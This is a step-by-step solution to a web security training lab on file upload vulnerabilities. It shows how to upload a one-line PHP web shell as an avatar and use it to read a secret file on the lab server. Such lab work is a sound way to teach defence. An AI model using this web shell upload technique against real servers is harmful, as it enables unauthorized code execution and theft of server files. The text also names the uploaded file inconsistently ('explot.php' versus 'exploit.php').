# Lab: Remote code execution via web shell upload

## Description

This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file ```/home/carlos/secret```. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: ```wiener:peter```

[ACCESS LAB](<https://portswigger.net/web-security/learning-paths/server-side-vulnerabilities-apprentice/file-upload-apprentice/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload#>)

## Solution

1. Navigate into "My account".
1. Upload a file as avatar with name explot.php with the content:
    > ```<?php echo file_get_contents('/home/carlos/secret'); ?>```
1. Now inspect the image with the browser developer tools.
1. You see ```<img src="/files/avatars/exploit.php" class="avatar">```
1. Copy the link address and visit it in the browser.
1. The page will contain the secret you must submit by clicking the button at the top of the lab page to solve it.
